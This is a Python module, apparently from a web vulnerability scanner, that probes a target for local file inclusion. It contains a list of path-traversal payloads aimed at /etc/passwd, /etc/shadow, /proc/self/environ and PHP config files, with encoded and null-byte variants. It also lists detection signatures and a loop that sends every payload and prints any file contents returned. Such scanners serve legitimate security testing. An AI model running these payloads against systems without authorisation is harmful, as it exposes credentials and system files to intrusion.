# Détection des inclusions locales de fichiers (LFI)
import requests
import urllib3
from core.config import create_session, DEFAULT_TIMEOUT

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Liste des payloads LFI à tester
LFI_PAYLOADS = [
    "../../../../../../../../../../../../../../../../etc/passwd",
    "../../../../../../../../../../../../../../../../etc/shadow",
    "../../../../../../../../../../../../../../../../etc/hostname",
    "../../../../../../../../../../../../../../../../etc/issue",
    "../../../../../../../../../../../../../../../../etc/motd",
    "../../../../../../../../../../../../../../../../etc/group",
    "../../../../../../../../../../../../../../../../etc/hosts",
    "../../../../../../../../../../../../../../../../etc/apache2/apache2.conf",
    "../../../../../../../../../../../../../../../../etc/httpd/httpd.conf",
    "../../../../../../../../../../../../../../../../var/www/html/config.php",
    "../../../../../../../../../../../../../../../../proc/self/environ",
    "../../../../../../../../../../../../../../../../proc/self/cmdline",
    "../../../../../../../../../../../../../../../../boot.ini",
    "../../../../../../../../../../../../../../../../Windows/windows.ini",
    "....//....//....//....//....//....//etc/passwd",
    "..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd",
    "..%252f..%252f..%252f..%252fetc/passwd",
    "%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd",
]

LFI_SIGNATURES = [
    "root:x:0:0",
    "[extensions]",
    "root:", "daemon:", "bin:", "sys:",
    "[boot loader]", "[operating systems]",
    "ServerName", "DocumentRoot",
    "[mysqld]", "[client]", "******EXT3", "EXT4", "UUID=", "dev/sda",
    "HTTP_USER_AGENT", "HTTP_COOKIE", "HTTP_HOST",
    "Warning: include(", "Warning: require(", "failed to open stream",
    "No such file or directory", "on line", "open_basedir restriction",
]

# Common LFI parameter names to test
LFI_PARAMS = ["page", "file", "path", "include", "doc", "document", "folder",
              "root", "pg", "style", "pdf", "template", "php_path", "url"]


def scan_lfi(target, formated_target, timeout=DEFAULT_TIMEOUT):
    """Teste l'inclusion de fichiers locaux (LFI)."""
    print(f"\n\t==============Scan LFI sur -->{formated_target}<-- 🔍 ==============\n")

    vuln_found = False
    findings = {}
    session = create_session()

    for payload in LFI_PAYLOADS:
        for param in LFI_PARAMS:
            for extra in ["", "%00", "%2500"]:
                url = f"{target}/?{param}={payload}{extra}"
                try:
                    response = session.get(url, timeout=timeout)
                    response_text = response.text.lower()

                    if any(signature.lower() in response_text for signature in LFI_SIGNATURES):
                        print(f"[!!!] LFI détectée dans l'URL : {url}")
                        print(f"[!!!] Contenu reçu : {response.text[:500]}...")
                        vuln_found = True
                        findings[url] = {"status": "VULNERABLE", "param": param, "payload": payload}

                except requests.exceptions.RequestException:
                    pass

    if not vuln_found:
        print("\n✅  Aucune LFI détectée.\n")

    return findings
